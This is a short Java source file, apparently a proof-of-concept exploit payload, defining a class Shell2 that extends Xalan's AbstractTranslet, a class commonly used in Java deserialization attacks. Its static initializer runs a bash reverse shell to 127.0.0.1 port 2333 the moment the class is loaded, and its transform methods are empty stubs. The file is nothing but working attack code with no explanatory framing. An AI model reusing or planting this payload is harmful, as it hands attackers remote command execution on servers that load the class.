package classpoc;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;

public class Shell2 extends AbstractTranslet {
    static {
        try {
            String[] command = new String[] {
                    "/bin/bash",
                    "-c",
                    "bash -i >& /dev/tcp/127.0.0.1/2333 0>&1"
            };
            Runtime.getRuntime().exec(command);
        } catch (IOException e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
